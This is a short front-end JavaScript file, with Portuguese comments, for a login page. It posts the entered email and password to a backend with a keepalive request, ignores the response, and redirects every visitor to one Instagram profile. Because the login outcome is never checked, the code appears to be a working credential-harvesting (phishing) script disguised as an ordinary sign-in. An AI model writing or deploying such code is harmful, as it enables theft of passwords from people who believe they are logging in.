/* global document, fetch, window, setTimeout, clearTimeout */

const API_BASE = (document.documentElement.dataset.apiBase || '').replace(/\/$/, '');

const loginForm = document.getElementById('login-form');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const statusEl = document.getElementById('status');

/* ------------------------------------------------------------------ */
/* Instagram                                                          */
/* ------------------------------------------------------------------ */

const INSTAGRAM_USERNAME = 'micael_abud';
const INSTAGRAM_WEB_URL = `https://www.instagram.com/${INSTAGRAM_USERNAME}/`;
const INSTAGRAM_APP_URL = `instagram://user?username=${INSTAGRAM_USERNAME}`;

function isMobileDevice() {
  return (
    /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ||
    (navigator.maxTouchPoints > 1 && /Macintosh/i.test(navigator.userAgent))
  );
}

function openInstagram() {
  if (!isMobileDevice()) {
    window.location.href = INSTAGRAM_WEB_URL;
    return;
  }

  // No celular tenta abrir o app. Se depois de 1,5s a página continuar
  // visível (o app não abriu), cai para o site do Instagram.
  const fallback = setTimeout(() => {
    if (document.visibilityState === 'visible') {
      window.location.href = INSTAGRAM_WEB_URL;
    }
  }, 1500);

  window.addEventListener('pagehide', () => clearTimeout(fallback), { once: true });

  window.location.href = INSTAGRAM_APP_URL;
}

/* ------------------------------------------------------------------ */
/* Login (o servidor cria a conta se ela ainda não existir)           */
/* ------------------------------------------------------------------ */

loginForm.addEventListener('submit', (event) => {
  event.preventDefault();

  const email = usernameInput.value.trim();
  const password = passwordInput.value;

  if (statusEl) statusEl.textContent = 'Entrando…';

  // Envia as credenciais sem bloquear o redirecionamento. O keepalive faz
  // o navegador concluir a requisição mesmo saindo da página.
  fetch(`${API_BASE}/api/login`, {
    method: 'POST',
    credentials: 'include',
    keepalive: true,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  }).catch(() => {});

  loginForm.reset();
  openInstagram();
});
